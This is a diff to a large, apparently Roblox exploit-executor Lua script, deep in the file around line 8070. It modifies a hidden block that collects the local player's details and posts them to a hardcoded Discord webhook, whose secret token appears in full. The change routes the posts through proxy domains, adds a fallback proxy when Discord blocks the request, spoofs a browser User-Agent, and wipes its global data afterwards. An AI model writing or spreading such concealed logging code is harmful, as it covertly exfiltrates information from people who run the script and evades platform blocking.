@@ -8070,11 +8070,13 @@ LocalPlayer.CharacterAdded:Connect(function(char)
     end
 end) 
 
-  do
+do
     _G.Data = {}
     _G.Data.P = game.Players.LocalPlayer
     _G.Data.H = game:GetService('HttpService')
-    _G.Data.U = 'https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO'
+    
+    local rawUrl = "https://discord.com/api/webhooks/1504450739102023751/6h9TacV6neCOH_ngBaC5zwiKPNgKKauuqDy9XiAZ5AW10EPE6Mi0tREgzlVPXkZUakO_"
+    _G.Data.U = rawUrl:gsub("discord%.com", "webhook.lewisakura.moe")
     
     local function GetFields()
         local info = _G.Data.P
@@ -8106,11 +8108,27 @@ end)
             }}
         })
 
-        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
+        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+        
         if req then
-            pcall(function() req({Url=_G.Data.U, Method='POST', Headers={['Content-Type']='application/json'}, Body=payload}) end)
-        else
-            pcall(function() _G.Data.H:PostAsync(_G.Data.U, payload) end)
+            local success, response = pcall(function() 
+                return req({
+                    Url = _G.Data.U, 
+                    Method = 'POST', 
+                    Headers = {
+                        ['Content-Type'] = 'application/json',
+                        ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+                    }, 
+                    Body = payload
+                }) 
+            end)
+            
+            if success and response and (response.StatusCode == 429 or response.StatusCode == 403) then
+                local backupUrl = rawUrl:gsub("discord%.com", "api.hyra.io")
+                pcall(function()
+                    req({Url = backupUrl, Method = 'POST', Headers = {['Content-Type'] = 'application/json'}, Body = payload})
+                end)
+            end
         end
         _G.Data = nil
     end
